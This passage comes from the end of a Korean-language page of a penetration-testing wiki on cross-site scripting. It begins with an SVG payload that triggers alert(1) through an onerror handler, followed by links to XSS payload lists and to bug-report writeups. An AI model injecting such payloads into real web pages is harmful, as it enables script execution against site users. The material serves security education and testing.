<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg' &gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
```
다음에서 **더 많은 SVG payloads를** 확인하세요: [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)

## 기타 JS 트릭 및 관련 정보


{{#ref}}
other-js-tricks.md
{{#endref}}

## XSS resources

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)
- [http://www.xss-payloads.com](http://www.xss-payloads.com) [https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt) [https://github.com/materaj/xss-list](https://github.com/materaj/xss-list)
- [https://github.com/ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
- [https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)
- [https://netsec.expert/2020/02/01/xss-in-2020.html](https://netsec.expert/2020/02/01/xss-in-2020.html)
- [https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide](https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide)

## References

- [Turning a harmless XSS behind a WAF into a realistic phishing vector](https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/)
- [XSS and SSRF via the List-Unsubscribe SMTP Header in Horde Webmail and Nextcloud Mail](https://security.lauritz-holtmann.de/post/xss-ssrf-list-unsubscribe/)
- [HackerOne Report #2902856 - Nextcloud Mail List-Unsubscribe SSRF](https://hackerone.com/reports/2902856)
- [From "Low-Impact" RXSS to Credential Stealer: A JS-in-JS Walkthrough](https://r3verii.github.io/bugbounty/2025/08/25/rxss-credential-stealer.html)
- [MDN eval()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)
- [CAPIG XSS: postMessage origin trust becomes a script loader + backend JS concatenation enables supply-chain stored XSS](https://ysamm.com/uncategorized/2026/01/13/capig-xss.html)
- [MobSF stored XSS via manifest analysis (unsafe Django safe sink)](https://github.com/advisories/GHSA-8hf7-h89p-3pqj)

{{#include ../../banners/hacktricks-training.md}}
